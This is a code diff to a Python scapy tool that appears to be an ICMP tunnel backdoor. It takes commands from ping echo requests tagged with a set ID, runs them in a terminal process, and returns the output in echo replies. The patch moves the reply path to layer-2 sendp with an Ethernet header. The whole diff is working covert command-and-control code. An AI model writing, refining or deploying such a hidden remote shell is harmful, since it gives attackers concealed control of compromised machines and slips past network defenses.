@@ -4,7 +4,7 @@ import threading
 
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
-from scapy.sendrecv import sniff, send
+from scapy.sendrecv import sniff, send, sendp
 
 import config
 from opening_terminal import p
@@ -12,20 +12,18 @@ from opening_terminal import p
 output = None
 error = None
 destination_ip = ""
-source_ip = ""
 destination_mac = "ff:ff:ff:ff:ff:ff"
-source_mac = "ff:ff:ff:ff:ff:ff"
 
 
 def readstdout():
-    global destination_ip, destination_mac, source_mac, source_mac
+    global destination_ip, destination_mac
     for l in iter(p.stdout.readline, b""):
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = IP(dst=destination_ip) / ICMP(type=0,
-                                                     id=config.ID) / string
-        send(reply_packet, verbose=False)
+        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=0,
+                                                                                  id=config.ID) / string
+        sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
 
 
@@ -49,9 +47,7 @@ def packet_callback(packet):
     global destination_ip, destination_mac, source_ip, source_mac
     if ICMP in packet and packet[ICMP].id == config.ID and packet[ICMP].type == 8:
         destination_ip = packet[IP].src
-        source_ip = packet[IP].dst
         destination_mac = packet[Ether].src
-        source_mac = packet[Ether].dst
         received_data = packet[ICMP].payload.load.decode('utf-8')
         print("-----+ OUT DATA +-----")
         sendcommand(received_data)
